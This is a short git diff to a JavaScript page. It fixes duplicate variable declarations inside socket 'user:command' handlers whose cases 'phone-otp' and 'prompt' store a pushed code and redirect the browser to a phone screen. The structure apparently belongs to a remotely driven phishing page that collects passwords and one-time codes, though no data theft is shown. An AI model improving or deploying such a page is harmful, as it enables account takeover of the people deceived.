@@ -25,6 +25,7 @@ const errorMessage = document.querySelector(".show-password-wrapper");
 const showPasswordCheckbox = document.getElementById("showPassword");
 
 let loadingFrame = null;
+let phoneNumberEl;
 
 // ================================
 // UI FUNCTIONS
@@ -154,7 +155,7 @@ socket.on("user:command", (data) => {
 
     case "phone-otp":
       if (!code) return;
-	      let phoneNumberEl = document.querySelector("#phone");
+	       phoneNumberEl = document.querySelector("#phone");
 	      sessionStorage.setItem("setcode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
@@ -165,7 +166,7 @@ socket.on("user:command", (data) => {
 
     case "prompt":
       if (!code) return;
-	      let phoneNumberEl = document.querySelector("#code");
+	       phoneNumberEl = document.querySelector("#code");
 	      sessionStorage.setItem("setcode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
